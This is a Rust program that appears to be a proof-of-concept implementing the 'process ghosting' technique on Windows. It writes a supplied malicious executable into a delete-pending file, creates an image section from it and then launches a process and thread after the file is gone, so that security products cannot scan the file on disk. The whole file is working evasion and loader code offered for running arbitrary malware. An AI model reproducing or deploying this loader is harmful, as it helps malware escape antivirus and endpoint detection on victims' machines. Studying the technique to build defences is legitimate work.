use std::ffi::CString;
use std::io::Read;
use std::mem::MaybeUninit;
use std::ptr;

use anyhow::{Result, bail};
use clap::{ArgAction, Parser};
use clio::ClioPath;
use log::{info, trace};
use ntapi::ntpsapi::{NtCreateProcessEx, NtCreateThreadEx, PROCESS_BASIC_INFORMATION};
use ntapi::ntrtl::{
    RTL_USER_PROC_PARAMS_NORMALIZED, RTL_USER_PROCESS_PARAMETERS, RtlCreateProcessParametersEx,
};
use utils::unicode_string::to_unicode_string;
use windows::Wdk::Storage::FileSystem::NtCreateSection;
use windows::Wdk::System::Threading::{NtQueryInformationProcess, ProcessBasicInformation};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::Storage::FileSystem::{
    CreateFileA, DELETE, FILE_ATTRIBUTE_NORMAL, FILE_DISPOSITION_INFO, FILE_GENERIC_EXECUTE,
    FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE,
    FileDispositionInfo, FlushFileBuffers, OPEN_ALWAYS, SYNCHRONIZE, SetFileInformationByHandle,
    WriteFile,
};
use windows::Win32::System::Diagnostics::Debug::{
    ImageNtHeader, ReadProcessMemory, WriteProcessMemory,
};
use windows::Win32::System::Environment::CreateEnvironmentBlock;
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, SEC_IMAGE, SECTION_ALL_ACCESS, VirtualAllocEx,
};
use windows::Win32::System::Threading::{
    GetCurrentProcess, GetExitCodeThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
    WaitForSingleObject,
};
use windows::core::PCSTR;

use utils::safehandle::SafeHandle;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[clap(value_parser = clap::value_parser!(ClioPath), default_value = "./real_exe.exe", help = "Will be created and used by the malicious exe")]
    target_exe: ClioPath,
    #[clap(value_parser = clap::value_parser!(ClioPath).exists().is_file(), default_value = "./malicious_exe.exe")]
    malicious_exe: ClioPath,

    #[arg(long, short, action = ArgAction::Count)]
    verbose: u8,
}

fn main() -> Result<()> {
    let args = Args::parse();
    let log_level = match args.verbose {
        0 => log::LevelFilter::Error, // Default
        1 => log::LevelFilter::Warn,
        2 => log::LevelFilter::Info,
        3 => log::LevelFilter::Debug,
        _ => log::LevelFilter::Trace, // 4 or more
    };

    env_logger::Builder::new().filter_level(log_level).init();

    let h_target = create_file(&args.target_exe)?;

    set_delete_pending(&h_target)?;

    let mut malicious_exe_buf = vec![];
    read_file(&args.malicious_exe, &mut malicious_exe_buf)?;

    let h_section = write_malicious_content(&h_target, &malicious_exe_buf)?;

    // Explicitly drop target file handle, it will be deleted now
    drop(h_target);

    let h_process = create_process(&h_section)?;
    let pbi = get_process_basic_information(&h_process)?;
    let entry_point = get_entry_point(&h_process, pbi)?;

    let proc_params = setup_process_parameters(&args.malicious_exe)?;
    link_params_to_ghost_process(&h_process, pbi.PebBaseAddress as usize, proc_params)?;

    // `PsSetCreateProcessNotifyRoutineEx` triggers here!
    let h_ghost = start_ghost_thread(&h_process, entry_point)?;

    unsafe {
        trace!("Waiting for ghost thread...");
        WaitForSingleObject(h_ghost.0, 2000); // Wait 2 seconds
        let mut exit_code: u32 = 0;
        GetExitCodeThread(h_ghost.0, &raw mut exit_code)?;
        info!("Ghost thread exit code: {exit_code:#x}");
    }

    Ok(())
}

fn create_file(target_exe: &ClioPath) -> Result<SafeHandle> {
    trace!("Creating CString");

    // C-String required for Null-Termination
    let target_exe_cstr = CString::new(
        target_exe
            .path()
            .to_str()
            .expect("Path contains invalid UTF-8"),
    )
    .expect("Conversion to CString failed");

    trace!("Successfully created CString");

    trace!("Creating file {target_exe}");

    unsafe {
        let handle = CreateFileA(
            PCSTR(target_exe_cstr.as_ptr().cast::<u8>()),
            (DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE | FILE_GENERIC_EXECUTE)
                .0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            None,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )?
        .into();

        info!("CreateFileA call finished");

        Ok(handle)
    }
}

fn set_delete_pending(fh: &SafeHandle) -> Result<()> {
    let fdi: FILE_DISPOSITION_INFO = FILE_DISPOSITION_INFO { DeleteFile: true };

    trace!("Created FileDispositionInfo");
    trace!("Setting File Information");

    unsafe {
        SetFileInformationByHandle(
            fh.0,
            FileDispositionInfo,
            (&raw const fdi).cast(),
            u32::try_from(std::mem::size_of::<FILE_DISPOSITION_INFO>())
                .expect("Expected size of FileDispositionInfo to fit in u32"),
        )?;
    }
    info!("SetFileInformationByHandle call finished");

    Ok(())
}

fn read_file(file: &ClioPath, buf: &mut Vec<u8>) -> Result<()> {
    trace!("Opening exe file from {file}");
    let mut file = file.clone().open()?;

    trace!("Reading malicious exe file in memory");
    let bytes_read = file.read_to_end(buf)?;
    info!("Finished reading malicious exe file in memory, {bytes_read} bytes read");

    Ok(())
}

fn write_malicious_content(h_target: &SafeHandle, buf: &[u8]) -> Result<SafeHandle> {
    let mut bytes_written: u32 = 0;

    trace!("Writing malicious code to target file handle");
    unsafe {
        WriteFile(h_target.0, Some(buf), Some(&raw mut bytes_written), None)?;
    }
    info!("WriteFile call finished, wrote {bytes_written} bytes");

    trace!("Flushing file buffers to ensure kernel consistency");
    unsafe {
        FlushFileBuffers(h_target.0)?;
    }

    let mut h_section = HANDLE::default();

    unsafe {
        let status = NtCreateSection(
            &raw mut h_section,
            SECTION_ALL_ACCESS.0,
            None,
            None,
            PAGE_READWRITE.0,
            SEC_IMAGE.0,
            Some(h_target.0),
        );

        if status.0 != 0 {
            bail!(
                "Error while calling NtCreateSection, received status {:#x}",
                status.0
            )
        }
    }

    Ok(h_section.into())
}

fn create_process(h_section: &SafeHandle) -> Result<SafeHandle> {
    let mut h_process = HANDLE::default();

    /* // Debug
    unsafe {
        let mut base_address: *mut ntapi::winapi::ctypes::c_void = ptr::null_mut();
        let mut view_size: usize = 0;

        // If this fails, the Section is definitely invalid
        let status = NtMapViewOfSection(
            h_section.0.0 as *mut _,
            GetCurrentProcess().0 as *mut _,
            &mut base_address,
            0,
            0,
            ptr::null_mut(),
            &mut view_size,
            ViewShare,
            0,
            PAGE_READONLY.0,
        );

        trace!("Debug Map Status: {:#x} at {:?}", status, base_address);

        if status == 0 {
            let _ = NtUnmapViewOfSection(GetCurrentProcess().0 as *mut _, base_address);
        }
    } */

    unsafe {
        let status = NtCreateProcessEx(
            (&raw mut h_process.0).cast(),
            PROCESS_ALL_ACCESS.0,
            ptr::null_mut(),
            GetCurrentProcess().0.cast(),
            0,
            h_section.0.0.cast(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
        );

        if status != 0 {
            bail!("Error while calling NtCreateProcessEx, received status {status:#x}")
        }
    }

    Ok(h_process.into())
}

fn get_process_basic_information(h_process: &SafeHandle) -> Result<PROCESS_BASIC_INFORMATION> {
    let mut proc_info = MaybeUninit::<PROCESS_BASIC_INFORMATION>::uninit();
    let mut return_length: u32 = 0;

    // TODO: try NtCreateUserProcess

    unsafe {
        let status = NtQueryInformationProcess(
            h_process.0,
            ProcessBasicInformation,
            proc_info.as_mut_ptr().cast(),
            u32::try_from(std::mem::size_of::<PROCESS_BASIC_INFORMATION>())
                .expect("Expected ProcessBasicInformation length to fit in u32"),
            &raw mut return_length,
        );

        if status.0 != 0 {
            bail!(
                "Error while calling NtCreateProcessEx, received status {:#x}",
                status.0
            )
        }
    }

    let proc_info = unsafe { proc_info.assume_init() };

    Ok(proc_info)
}

fn get_entry_point(h_process: &SafeHandle, pbi: PROCESS_BASIC_INFORMATION) -> Result<usize> {
    let mut image_base = 0;
    let mut bytes_read = 0;

    unsafe {
        // 1. Read ImageBaseAddress from PEB (Offset 0x10 for x64)
        ReadProcessMemory(
            h_process.0,
            (pbi.PebBaseAddress as usize + 0x10) as *const _,
            (&raw mut image_base).cast(),
            std::mem::size_of::<usize>(),
            Some(&raw mut bytes_read),
        )?;

        // 2. Map the header locally to parse it
        // We read a large enough chunk to contain the headers (typically 4096 bytes)
        let mut header_buffer = vec![0u8; 4096];
        ReadProcessMemory(
            h_process.0,
            image_base as *const _,
            header_buffer.as_mut_ptr().cast(),
            header_buffer.len(),
            None,
        )?;

        // 3. Use ImageNtHeader to find the NT headers in our local copy
        let nt_header_ptr = ImageNtHeader(header_buffer.as_ptr().cast());
        if nt_header_ptr.is_null() {
            bail!("ImageNtHeader failed to find valid PE headers");
        }

        let nt_headers = &*nt_header_ptr;

        // 4. Calculate Absolute Entry Point
        let entry_point_rva = nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
        let absolute_entry_point = image_base + entry_point_rva;

        Ok(absolute_entry_point)
    }
}

fn setup_process_parameters(target_exe: &ClioPath) -> Result<*mut RTL_USER_PROCESS_PARAMETERS> {
    let mut environment = ptr::null_mut();

    unsafe {
        CreateEnvironmentBlock(&raw mut environment, Some(HANDLE::default()), true)?;
    }

    let environment: *mut ntapi::winapi::ctypes::c_void = environment.cast();
    let mut img_path = to_unicode_string(&target_exe.to_string());
    let mut cmd_line = to_unicode_string(&target_exe.to_string()); // Often same as path
    let mut params: *mut RTL_USER_PROCESS_PARAMETERS = ptr::null_mut();

    unsafe {
        let status = RtlCreateProcessParametersEx(
            &raw mut params,
            &raw mut img_path,
            ptr::null_mut(),
            ptr::null_mut(),
            &raw mut cmd_line,
            environment,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            RTL_USER_PROC_PARAMS_NORMALIZED,
        );

        if status != 0 {
            bail!("Error while calling NtCreateProcessEx, received status {status:#x}");
        }
    }

    Ok(params)
}

fn link_params_to_ghost_process(
    h_process: &SafeHandle,
    peb_base: usize,
    local_params: *mut RTL_USER_PROCESS_PARAMETERS,
) -> Result<()> {
    unsafe {
        // 1. Get the TRUE size of the entire parameter block
        let total_size = (*local_params).Length as usize;

        // 2. Allocate exactly that much in the ghost
        let remote_params_ptr = VirtualAllocEx(
            h_process.0,
            None,
            total_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_params_ptr.is_null() {
            bail!("VirtualAllocEx failed");
        }

        let remote_base = remote_params_ptr as usize;
        let local_base = local_params as usize;

        // 3. FIX STRINGS: Convert local pointers to remote pointers
        // We calculate the offset of the string buffer from the start of the local block
        // and add it to the start of the remote block.
        let fix_unicode_string = |u_str: &mut ntapi::winapi::shared::ntdef::UNICODE_STRING| {
            if !u_str.Buffer.is_null() {
                let offset = u_str.Buffer as usize - local_base;
                u_str.Buffer = (remote_base + offset) as *mut _;
            }
        };

        fix_unicode_string(&mut (*local_params).CurrentDirectory.DosPath);
        fix_unicode_string(&mut (*local_params).DllPath);
        fix_unicode_string(&mut (*local_params).ImagePathName);
        fix_unicode_string(&mut (*local_params).CommandLine);
        fix_unicode_string(&mut (*local_params).WindowTitle);
        fix_unicode_string(&mut (*local_params).DesktopInfo);
        fix_unicode_string(&mut (*local_params).ShellInfo);

        // 4. NULL out the Environment for now (Simplifies debugging)
        // If this works without the environment, we can add the env migration back.
        (*local_params).Environment = ptr::null_mut();

        // 5. Sanitize handles and set flags
        (*local_params).CurrentDirectory.Handle = ptr::null_mut();
        (*local_params).StandardInput = ptr::null_mut();
        (*local_params).StandardOutput = ptr::null_mut();
        (*local_params).StandardError = ptr::null_mut();
        (*local_params).Flags |= RTL_USER_PROC_PARAMS_NORMALIZED; // NORMALIZED

        // 6. Write the fixed block
        WriteProcessMemory(
            h_process.0,
            remote_params_ptr,
            local_params as *const _,
            total_size,
            None,
        )?;

        // 7. Point PEB to it
        WriteProcessMemory(
            h_process.0,
            (peb_base + 0x20) as *const _,
            (&raw const remote_params_ptr).cast(),
            8,
            None,
        )?;
    }

    Ok(())
}

fn start_ghost_thread(h_process: &SafeHandle, entry_point: usize) -> Result<SafeHandle> {
    let mut h_thread = HANDLE::default();

    unsafe {
        let status = NtCreateThreadEx(
            (&raw mut h_thread.0).cast(),
            THREAD_ALL_ACCESS.0,
            ptr::null_mut(),
            h_process.0.0.cast(),
            entry_point as *mut _,
            ptr::null_mut(),
            0,
            0,
            0,
            0,
            ptr::null_mut(),
        );

        if status != 0 {
            anyhow::bail!("NtCreateThreadEx failed: {status:#x}");
        }
    }

    info!("Ghost thread created! Process is now running.");
    Ok(h_thread.into())
}
